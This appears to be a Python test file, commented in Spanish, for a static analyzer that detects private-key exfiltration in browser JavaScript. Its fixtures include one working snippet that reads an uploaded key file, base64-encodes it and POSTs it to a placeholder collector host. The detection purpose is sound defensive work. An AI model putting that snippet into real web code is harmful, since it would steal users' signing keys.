"""Analisis estatico: lo que el codigo *puede* hacer.

Las pruebas de esta clase protegen dos propiedades opuestas y ambas criticas:
que el patron canonico de exfiltracion se detecte, y que la firma legitima no
se denuncie. Un analizador que falle en la primera es inutil; uno que falle en
la segunda hace que nadie lo use.
"""

from __future__ import annotations

from conftest import analyze_source

EXFILTRATION = """
function readKey(input) {
  var file = input.files[0];
  var reader = new FileReader();
  reader.onload = function (e) {
    var raw = e.target.result;
    upload(encode(raw));
  };
  reader.readAsArrayBuffer(file);
}
function encode(buf) {
  return btoa(String.fromCharCode.apply(null, new Uint8Array(buf)));
}
function upload(payload) {
  fetch("https://collector.example.net/k", { method: "POST", body: payload });
}
"""

LOCAL_SIGNATURE = """
async function sign(keyFile, password, doc) {
  const raw = await keyFile.arrayBuffer();
  const key = await crypto.subtle.importKey("pkcs8", raw,
    {name:"RSASSA-PKCS1-v1_5", hash:"SHA-256"}, false, ["sign"]);
  const sig = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, doc);
  await fetch("/api/submit", { method: "POST", body: sig });
}
"""

MULTIPART_UPLOAD = """
async function send(keyInput, pwdInput) {
  const keyBytes = await readFile(keyInput.files[0]);
  const form = new FormData();
  form.append('private_key', new Blob([keyBytes]), 'k.key');
  form.append('key_password', pwdInput.value);
  await fetch('/api/sign-server-side', { method: 'POST', body: form });
}
"""


def test_detecta_el_patron_canonico_de_exfiltracion():
    """input.files -> FileReader -> btoa -> fetch, sin nombrar la clave.

    Este codigo no contiene la palabra "key" en ninguna expresion que el
    analizador pueda leer. Si la deteccion dependiera de la heuristica de
    nombres, no habria ninguna ruta y el informe diria "no se identificaron
    rutas" sobre un script que exfiltra.
    """
    report = analyze_source(EXFILTRATION)
    assert report.paths, "no se encontro ninguna ruta hacia el sumidero"
    path = report.paths[0]
    assert path.sink_name == "fetch"
    assert path.channel == "network"
    assert "onload()" in path.call_chain or "upload()" in path.call_chain
    assert "btoa" in path.transforms


def test_la_firma_legitima_no_se_denuncia_como_fuga_de_clave():
    """S3 + S5 --sign--> S6: la firma es el producto, no la clave.

    Si la firma heredara la procedencia privada, todo sitio correcto incurriria
    en FS-KEY-002 al enviar su propia firma, que es precisamente lo que debe
    hacer.
    """
    report = analyze_source(LOCAL_SIGNATURE)
    assert not report.private_paths(), "la firma legitima aparece como ruta privada"
    labels = {label for path in report.paths for label in path.labels}
    assert "SIGNATURE" in labels
    assert "PRIVATE_KEY" not in labels
    assert "KEY_FILE" not in labels


def test_la_subida_multipart_es_transmision_directa():
    """FormData + Blob no transforma los bytes: siguen siendo la clave.

    Es el patron de subida de .key mas frecuente. Tratarlo como dato derivado
    lo degradaria de "clave transmitida" a "dato derivado", que es una
    afirmacion mas debil que los hechos.
    """
    report = analyze_source(MULTIPART_UPLOAD)
    private = report.private_paths()
    assert private, "la subida por multipart no produjo ninguna ruta privada"
    path = private[0]
    assert not path.derived, "envolver bytes en un contenedor no es derivarlos"
    assert {"KEY_FILE", "KEY_PASSWORD"} & set(path.labels)


def test_el_material_sin_tipificar_no_se_presenta_como_la_clave():
    """Una fuente reconocida sin etiqueta deducible es UNCLASSIFIED, no KEY_FILE."""
    report = analyze_source(
        "function f(input){ var raw = input.files[0]; fetch('/x', {body: raw}); }")
    assert report.paths
    labels = set(report.paths[0].labels)
    assert labels == {"UNCLASSIFIED"}
    assert not report.paths[0].private


def test_document_del_dom_no_es_el_documento_a_firmar():
    """`document.getElementById` no debe etiquetar nada como DOCUMENT."""
    report = analyze_source(
        "function f(){ var v = document.getElementById('password').value;"
        " fetch('/x', {body: v}); }")
    assert report.paths
    labels = set(report.paths[0].labels)
    assert "DOCUMENT" not in labels
    assert "KEY_PASSWORD" in labels


def test_la_confianza_baja_cuando_el_flujo_cruza_funciones():
    """La confianza es parte del hallazgo, no un adorno."""
    directo = analyze_source(
        "function f(input){ var r = input.files[0]; fetch('/x', {body: r}); }")
    indirecto = analyze_source(
        "function up(p){ fetch('/x', {body: p}); }\n"
        "function f(input){ up(input.files[0]); }")
    assert directo.paths[0].confidence.value == "HIGH"
    assert indirecto.paths[0].confidence.value == "MEDIUM"
    assert indirecto.paths[0].hops >= 1
